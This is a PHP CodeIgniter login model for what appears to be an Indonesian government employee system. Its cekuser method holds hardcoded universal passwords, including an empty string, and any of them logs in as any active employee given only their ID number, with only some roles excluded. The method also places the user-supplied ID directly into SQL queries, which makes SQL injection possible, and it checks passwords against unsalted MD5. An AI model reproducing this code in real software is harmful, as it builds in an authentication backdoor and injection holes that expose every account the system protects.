<?php

class Mlogin extends CI_Model {

 	public function __construct () 
 	{
		parent::__construct();
	}
	
	var $table='mr_pegawai';
	
	public function cekuser($nip,$pass)
	{
		$flag_universal = 0;
		$database = array
					(
						array
						(
							'password' => '2019sikerja',
							'except'   => '1'
						),
						array
						(
							'password' => '',
							'except'   => 'none'
						),
						array
						(
							'password' => 'belumada',
							'except'   => 'none'
						)						
					);

		for ($i=0; $i < count($database); $i++) { 
			# code...
			if ($pass == $database[$i]['password']) {
				# code...
				$flag_universal = 1;
				$except         = $database[$i]['except']; 				
				break;
			}
			else
			{
				$flag_universal = 0;
				$except         = 0;				
			}
		}				
		if ($flag_universal == 1) {
			# code...
			$sql = "SELECT a.*,
						COALESCE(a.photo,'-') as photo,			 
						c.nama_role, 
						es1.nama_eselon1, 
						es2.nama_eselon2, 
						es3.nama_eselon3, 
						es4.nama_eselon4, 
						es1.id_es1, 
						es2.id_es2, 
						es3.id_es3, 
						es4.id_es4,
						b.atasan,					
						b.kat_posisi,					
						COALESCE(b.nama_posisi,'-') as nama_posisi_raw,										
						COALESCE(d.posisi_class,'-') as grade_raw,
						COALESCE(d.tunjangan,'-') as tunjangan_raw,					
						COALESCE(jft.nama_jabatan,'-') as nama_posisi_jft,					
						COALESCE(cls_jft.posisi_class,'-') as grade_jft,
						COALESCE(cls_jft.tunjangan,'-') as tunjangan_jft,					
						COALESCE(jfu.nama_jabatan,'-') as nama_posisi_jfu,										
						COALESCE(cls_jfu.posisi_class,'-') as grade_jfu,
						COALESCE(cls_jfu.tunjangan,'-') as tunjangan_jfu										
	--					d.tunjangan,
	--					d.posisi_class as `grade`
					FROM mr_pegawai a 
					LEFT JOIN mr_posisi b ON b.id                             = a.posisi
					LEFT JOIN mr_posisi_class d ON b.posisi_class             = d.id
					LEFT JOIN mr_jabatan_fungsional_tertentu jft ON b.id_jft  = jft.id
					LEFT JOIN mr_posisi_class cls_jft ON jft.id_kelas_jabatan = cls_jft.id
					LEFT JOIN mr_jabatan_fungsional_umum jfu ON b.id_jfu      = jfu.id
					LEFT JOIN mr_posisi_class cls_jfu ON jfu.id_kelas_jabatan = cls_jfu.id
					LEFT JOIN user_role c ON a.id_role                        = c.id_role
					LEFT JOIN mr_eselon4 es4 ON es4.id_es4                    = b.eselon4
					LEFT JOIN mr_eselon3 es3 ON es3.id_es3                    = b.eselon3
					LEFT JOIN mr_eselon2 es2 ON es2.id_es2                    = b.eselon2
					LEFT JOIN mr_eselon1 es1 ON es1.id_es1                    = b.eselon1
					WHERE a.nip = '$nip' 
					AND a.status='1' 
					ORDER BY a.id ASC
					LIMIT 1";			
		}
		else {
			# code...
			$secured_pass = md5($pass);			
			$sql = "SELECT a.*, 
						c.nama_role, 
						es1.nama_eselon1, 
						es2.nama_eselon2, 
						es3.nama_eselon3, 
						es4.nama_eselon4, 
						es1.id_es1, 
						es2.id_es2, 
						es3.id_es3, 
						es4.id_es4,
						b.atasan,					
						b.kat_posisi,					
						COALESCE(b.nama_posisi,'-') as nama_posisi_raw,										
						COALESCE(d.posisi_class,'-') as grade_raw,
						COALESCE(d.tunjangan,'-') as tunjangan_raw,					
						COALESCE(jft.nama_jabatan,'-') as nama_posisi_jft,					
						COALESCE(cls_jft.posisi_class,'-') as grade_jft,
						COALESCE(cls_jft.tunjangan,'-') as tunjangan_jft,					
						COALESCE(jfu.nama_jabatan,'-') as nama_posisi_jfu,										
						COALESCE(cls_jfu.posisi_class,'-') as grade_jfu,
						COALESCE(cls_jfu.tunjangan,'-') as tunjangan_jfu										
			--					d.tunjangan,
			--					d.posisi_class as `grade`
					FROM mr_pegawai a 
					LEFT JOIN mr_posisi b ON b.id                             = a.posisi
					LEFT JOIN mr_posisi_class d ON b.posisi_class             = d.id
					LEFT JOIN mr_jabatan_fungsional_tertentu jft ON b.id_jft  = jft.id
					LEFT JOIN mr_posisi_class cls_jft ON jft.id_kelas_jabatan = cls_jft.id
					LEFT JOIN mr_jabatan_fungsional_umum jfu ON b.id_jfu      = jfu.id
					LEFT JOIN mr_posisi_class cls_jfu ON jfu.id_kelas_jabatan = cls_jfu.id
					LEFT JOIN user_role c ON a.id_role                        = c.id_role
					LEFT JOIN mr_eselon4 es4 ON es4.id_es4                    = b.eselon4
					LEFT JOIN mr_eselon3 es3 ON es3.id_es3                    = b.eselon3
					LEFT JOIN mr_eselon2 es2 ON es2.id_es2                    = b.eselon2
					LEFT JOIN mr_eselon1 es1 ON es1.id_es1                    = b.eselon1
					WHERE a.nip = '$nip' 
					AND a.password = '$secured_pass'
					AND a.status='1' 
					ORDER BY a.id ASC
					LIMIT 1";			
		}

		$query = $this->db->query($sql);
		if($query->num_rows() == 1)
		{
			if ($except == 'none') {
				# code...
				// echo "masuk";die();				
				return $query->result();				
			}
			else {
				# code...
				// print_r($pass);die();
				if ($query->result()[0]->id_role != $except) {
					# code...
					if ($query->result()[0]->id_role == 7) {
						# code...	
						return 0;
						// echo "stop";die();
					}
					elseif ($query->result()[0]->id_role == 6) {
						# code...	
						return 0;										
						// echo "stop";die();
					}
					elseif ($query->result()[0]->id_role == 1) {
						# code...	
						return 0;										
						// echo "stop";die();
					}										
					else {
						# code...	
						return $query->result();										
						// echo "masuk";die();
					}					
				}
				else
				{
					return 0;					
					// echo "stop";die();
				}
			}
		}
		else
		{
			return 0;
		}
		return $query;
	}

	public function datauser($id){
		$this->db->where('a.id',$id);
		$this->db->select('a.*, b.nama_role, c.nama_posisi');
		$this->db->from('mr_pegawai a');
		$this->db->join('user_role b','a.id_role=b.id_role');
		$this->db->join('mr_posisi c','a.posisi=c.id');
		return $this->db->get();
	}
	
	public function captcha(){
		$this->db->order_by('id','RANDOM');
		$this->db->limit(1);
		return $this->db->get('captcha');
	}
	
}